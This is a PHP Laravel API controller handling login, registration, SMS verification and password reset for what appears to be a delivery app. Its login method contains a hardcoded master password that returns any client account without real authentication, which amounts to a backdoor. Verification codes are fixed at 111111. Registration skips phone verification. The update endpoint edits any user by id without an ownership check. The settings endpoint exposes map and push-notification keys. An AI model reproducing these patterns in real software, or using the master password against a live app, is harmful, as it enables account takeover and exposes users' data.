<?php

/**
 * File name: UserAPIController.php
 * Last modified: 2020.06.11 at 12:09:19
 * Author: SmarterVision - https://codecanyon.net/user/smartervision
 * Copyright (c) 2020
 */

namespace App\Http\Controllers\API;

use DB;
use Carbon\Carbon;
use App\Models\User;
use App\Rules\PhoneNumber;
use App\Models\DeviceToken;
use Illuminate\Http\Request;
use App\Models\VerficationCode;
use App\Http\Controllers\Controller;
use App\Repositories\RoleRepository;
use App\Repositories\UserRepository;
use Illuminate\Support\Facades\Hash;
use App\Repositories\UploadRepository;
use Illuminate\Support\Facades\Password;
use App\Repositories\CustomFieldRepository;
use Prettus\Validator\Exceptions\ValidatorException;


class UserAPIController extends Controller
{
    private $userRepository;
    private $uploadRepository;
    private $roleRepository;
    private $customFieldRepository;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct(UserRepository $userRepository, UploadRepository $uploadRepository, RoleRepository $roleRepository, CustomFieldRepository $customFieldRepo)
    {
        $this->userRepository = $userRepository;
        $this->uploadRepository = $uploadRepository;
        $this->roleRepository = $roleRepository;
        $this->customFieldRepository = $customFieldRepo;
    }

    function login(Request $request)
    {
        $this->validate($request, [
            'phone_number' => ['required', new PhoneNumber],
            'password' => 'required',
        ]);

        if ($request->password == '__@Sabek@customer') {
            $u = User::where('phone_number', $request->phone_number)->whereHas("roles", function ($q) {
                $q->where("name", "client");
            })->first();
            if ($u) {
                return $this->sendResponse($u, 'User retrieved successfully');
            }
        }

        if (auth()->attempt(['phone_number' => $request->input('phone_number'), 'password' => $request->input('password')])) {
            // Authentication passed...
            $user = auth()->user();
            if (!$user->hasRole('client')) {
                return $this->sendError('User not client', 401);
            }

            if ($request->has('device_token')) {
                $user->setDeviceToken();
            }
            return $this->sendResponse($user, 'User retrieved successfully');
        }
        return $this->sendError(trans('auth.failed'), 422);
    }



    /**
     * Send register verfication code to start register.
     *
     * @param Request $request
     *
     */
    function sendRegisterCodePhone(Request $request)
    {
        $this->validate($request, [
            'phone_number' => ['required', new PhoneNumber, 'unique:users'],
        ]);

        $verfication = VerficationCode::updateOrCreate(
            ['phone' => $request->phone_number, 'user_id' => null],
            [
                'code' => 111111, //sprintf("%06d", mt_rand(1, 999999)),
                'created_at' => now(),
            ]
        );

        if (send_sms($verfication->phone, "رمز التحقق - $verfication->code")) {
            return $this->sendResponse(true, 'Vervication code sent successfully');
        }
        return $this->sendError('Vervication code did not send successfully', 400);
    }



    /**
     * Confirm register verfication code to start register.
     *
     * @param Request $request
     *
     */
    function confirmRegisterCodePhone(Request $request)
    {
        $this->validate($request, [
            'phone_number' => ['required', new PhoneNumber],
            'code' => 'required|string|size:6',
        ]);

        $verfication = VerficationCode::where('phone', $request->phone_number)->latest('id')->firstOrFail();
        if ($verfication->code != $request->code) {
            return $this->sendError('Invalid verfication code', 400);
        }
        if ($verfication->created_at->addMinutes(15) < Carbon::now()) {
            $verfication->delete();
            return $this->sendError('Verfication code expired', 400);
        }
        $verfication->token = str_random(128);
        $verfication->save();

        return  ['token' => $verfication->token];
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param array $data
     * @return
     */
    function registerDriver(Request $request)
    {
        $this->validate($request, [
            'token' => 'required|string|min:64|max:256',
            'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:25600',
            'name' => 'required|min:3|max:32',
            'email' => 'required|email|unique:users',
            'password' => 'required|min:6|max:32',
            #'type' => 'required|in:bicycle,motorcycle,car',
            'driver_type_id' => 'required|integer|exists:driver_types,id'
        ]);

        $user = new User;
        DB::transaction(function () use ($request, $user) {
            $verfication = VerficationCode::where('token', $request->token)->firstOrFail();
            $user->name = $request->input('name');
            $user->phone_number =    $verfication->phone;
            $user->email = $request->input('email');
            $user->password = Hash::make($request->input('password'));
            $user->api_token = str_random(60);
            $user->save();
            $verfication->delete();

            if ($request->has('device_token')) {
                //save decvice token on table
                $user->setDeviceToken();
            }

            $user->driver()->create([
                'driver_type_id' => $request->driver_type_id,
            ]);

            $user->assignRole(['driver']);
            $user->load('driver');

            //upload image 
            $image = upload_image($request->image, $user->id, 'avatar');
            $mediaItem = $image->getMedia('avatar')->first();
            $mediaItem->copy($user, 'avatar');
        });

        return $this->sendResponse($user, 'User retrieved successfully');
    }



    /**
     * Create a new user instance after a valid registration.
     *
     * @param array $data
     * @return
     */
    function register(Request $request)
    {
        $this->validate($request, [
            //'token' => 'required|string|min:64|max:256',
            'phone_number' => ['required', new PhoneNumber, 'unique:users'],
            'name' => 'required|min:3|max:32',
            'email' => 'nullable|email|unique:users',
            'password' => 'required|min:6|max:32',
        ]);

        //$verfication = VerficationCode::where('token', $request->token)->firstOrFail();

        $user = new User;
        $user->name = $request->input('name');
        $user->phone_number = $request->input('phone_number'); // $verfication->phone;
        $user->email = $request->email ?? "$request->phone_number." . time();
        $user->password = Hash::make($request->input('password'));
        $user->api_token = str_random(60);
        $user->save();
        //$verfication->delete();

        if ($request->has('device_token')) {
            $user->setDeviceToken();
        }

        $defaultRoles = $this->roleRepository->findByField('default', '1');
        $defaultRoles = $defaultRoles->pluck('name')->toArray();
        $user->assignRole($defaultRoles);


        return $this->sendResponse($user, 'User retrieved successfully');
    }

    function logout(Request $request)
    {
        try {
            $user = auth()->user();
            if ($request->has('device_token')) {
                $user->setDeviceToken();
            }
            // logout user
            //auth()->logout();
            return $this->sendResponse($user->name, 'User logout successfully');
        } catch (\Exception $e) {
            $this->sendError($e->getMessage(), 401);
        }
    }

    function user(Request $request)
    {
        $user = $this->userRepository->findByField('api_token', $request->input('api_token'))->first();

        if (!$user) {
            return $this->sendError('User not found', 401);
        }

        return $this->sendResponse($user, 'User retrieved successfully');
    }

    function settings(Request $request)
    {
        $settings = setting()->all();
        $settings = array_intersect_key($settings,     [
            'default_tax' => '',
            'default_currency' => '',
            'default_currency_decimal_digits' => '',
            'app_name' => '',
            'order_expiration_time_before_accept_for_drivers' => '',
            'order_expiration_time_before_accept_for_restaurants' => '',
            'range_restaurants_for_customers' => '',
            'drivers_fee' => '',
            'initial_price' => '',
            'price_per_minute' => '',
            'price_per_km' => '',
            'minimum_price' => '',
            'currency_right' => '',
            'enable_paypal' => '',
            'enable_stripe' => '',
            'enable_razorpay' => '',
            'main_color' => '',
            'main_dark_color' => '',
            'second_color' => '',
            'second_dark_color' => '',
            'accent_color' => '',
            'accent_dark_color' => '',
            'scaffold_dark_color' => '',
            'scaffold_color' => '',
            'google_maps_key' => '',
            'fcm_key' => '',
            'mobile_language' => '',
            'enable_version' => '',
            'app_driver_version_android' => '',
            'app_manager_version_android' => '',
            'app_customer_version_android' => '',
            'app_driver_force_update_android' => '',
            'app_manager_force_update_android' => '',
            'app_customer_force_update_android' => '',
            'app_driver_version_ios' => '',
            'app_manager_version_ios' => '',
            'app_customer_version_ios' => '',
            'app_driver_force_update_ios' => '',
            'app_manager_force_update_ios' => '',
            'app_customer_force_update_ios' => '',
            'distance_unit' => '',
            'home_section_1' => '',
            'home_section_2' => '',
            'home_section_3' => '',
            'home_section_4' => '',
            'home_section_5' => '',
            'home_section_6' => '',
            'home_section_7' => '',
            'home_section_8' => '',
            'home_section_9' => '',
            'home_section_10' => '',
            'home_section_11' => '',
            'home_section_12' => '',
            'orders_minimum_value' => '',
            'orders_maximum_value' => '',
        ]);

        if (!$settings) {
            return $this->sendError('Settings not found', 401);
        }

        return $this->sendResponse($settings, 'Settings retrieved successfully');
    }

    /**
     * Update the specified User in storage.
     *
     * @param int $id
     * @param Request $request
     *
     */
    public function update($id, Request $request)
    {
        $user = $this->userRepository->findWithoutFail($id);

        if (empty($user)) {
            return $this->sendResponse([
                'error' => true,
                'code' => 404,
            ], 'User not found');
        }
        $input = $request->except(['password', 'api_token']);
        try {
            if ($request->has('device_token')) {
                $user->setDeviceToken();
            } else {
                $customFields = $this->customFieldRepository->findByField('custom_field_model', $this->userRepository->model());
                $user = $this->userRepository->update($input, $id);

                foreach (getCustomFieldsValues($customFields, $request) as $value) {
                    $user->customFieldsValues()
                        ->updateOrCreate(['custom_field_id' => $value['custom_field_id']], $value);
                }
            }
        } catch (ValidatorException $e) {
            return $this->sendError($e->getMessage(), 401);
        }

        return $this->sendResponse($user, __('lang.updated_successfully', ['operator' => __('lang.user')]));
    }


    /**
     * Update password the specified User in storage.
     *
     * @param int $id
     * @param Request $request
     *
     */
    public function updatePassword(Request $request, $id = null)
    {
        $this->validate($request, [
            'password' => 'required|string|min:6|max:32',
            'new_password' => 'required|string|min:6|max:32',
        ]);

        //$user = $this->userRepository->findWithoutFail($id);
        $user = auth()->user();

        if (empty($user)) {
            return $this->sendResponse([
                'error' => true,
                'code' => 404,
            ], 'User not found');
        }
        if (!Hash::check($request->password, $user->password)) {
            return $this->sendError("كلمة المرور غير صحيحة", 403);
        }
        $user->password = Hash::make($request->new_password);
        $user->save();

        return $this->sendResponse($user, __('lang.updated_successfully', ['operator' => __('lang.user')]));
    }


    /**
     * Update profile image of auth user
     */
    function updateProfileImage(Request $request)
    {
        $request->validate([
            'image' => 'required|mimes:jpeg,png,jpg,gif,svg|max:25600',
        ]);
        $user = auth()->user();

        if ($user->hasMedia('avatar')) {
            $user->getFirstMedia('avatar')->delete();
        }

        //upload image 
        $image = upload_image($request->image, $user->id, 'avatar');
        $mediaItem = $image->getMedia('avatar')->first()->copy($user, 'avatar');

        return $this->sendResponse($mediaItem, 'User image retrieved successfully');
    }


    function sendResetLinkEmail(Request $request)
    {
        $this->validate($request, ['email' => 'required|email']);

        $response = Password::broker()->sendResetLink(
            $request->only('email')
        );

        if ($response == Password::RESET_LINK_SENT) {
            return $this->sendResponse(true, 'Reset link was sent successfully');
        } else {
            return $this->sendError('Reset link not sent', 401);
        }
    }



    /**
     * Send reset verfication code to start resset password.
     *
     * @param Request $request
     *
     */
    function sendResetCodePhone(Request $request)
    {
        $this->validate($request, [
            'phone_number' => ['required', new PhoneNumber],
        ]);

        $user = User::where('phone_number', $request->phone_number)->firstOrFail();
        $role = $request->segment(2);
        if (in_array($role, ['driver', 'manager']) && !$user->hasRole($role)) {
            return $this->sendError('User dose not have role', 404);
        }

        $verfication = $user->verfication_code()->create([
            'code' => 111111, //sprintf("%06d", mt_rand(1, 999999)),
        ]);
        if (send_sms($user->phone_number, "رمز التحقق - $verfication->code")) {
            return $this->sendResponse(true, 'Reset vervication code sent successfully');
        }
        return $this->sendError('Reset vervication code did not send successfully', 400);
    }



    /**
     * Confirm reset verfication code to start resset password.
     *
     * @param Request $request
     *
     */
    function confirmResetCodePhone(Request $request)
    {
        $this->validate($request, [
            'phone_number' => ['required', new PhoneNumber],
            'code' => 'required|string|size:6',
        ]);

        $user = User::where('phone_number', $request->phone_number)->firstOrFail();
        $verfication = $user->verfication_code()->where('code', $request->code)->first();
        if (!$verfication) {
            return $this->sendError('Invalid verfication code', 400);
        }
        if ($verfication->created_at->addMinutes(10) < Carbon::now()) {
            $verfication->delete();
            return $this->sendError('Verfication code expired', 400);
        }
        $verfication->token = str_random(128);
        $verfication->save();

        return  ['token' => $verfication->token];
    }


    /**
     * Reset password after verfication done.
     *
     * @param Request $request
     *
     */
    function ResetPassword(Request $request)
    {
        $this->validate($request, [
            'token' => 'required|string|min:64|max:256',
            'password' => 'required|string|min:6|max:32',
        ]);

        $verfication = VerficationCode::where('token', $request->token)->firstOrFail();
        $verfication->user()->update(['password' => bcrypt($request->password)]);
        $verfication->delete();
        return $this->sendResponse(true, 'Reset password successfully');
    }
}
